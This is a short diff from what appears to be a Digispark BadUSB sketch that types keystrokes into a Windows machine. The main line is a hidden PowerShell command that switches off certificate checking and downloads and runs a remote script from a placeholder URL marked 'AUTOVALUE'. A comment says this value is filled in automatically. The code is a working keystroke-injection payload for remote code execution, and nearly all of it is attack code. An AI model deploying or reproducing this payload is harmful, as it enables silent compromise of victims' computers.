@@ -47,7 +47,7 @@ void loop() {
 //  DigiKeyboard.delay(500);
 //  DigiKeyboard.println("start C:/Windows/System32/Ribbons.scr /s");
 //  DigiKeyboard.delay(250);
-  DigiKeyboard.println("powershell -windowstyle hidden \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('AUTOVALUE')\"");
+  DigiKeyboard.println("powershell -windowstyle hidden \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('AUTOVALUE')\""); // Do not delete "AUTOVALUE", it is a index.
 //  DigiKeyboard.delay(250);
 //  DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT); // Save the file and return to cmd shell use delay of 500ms
 //  DigiKeyboard.sendKeyStroke(KEY_ENTER);
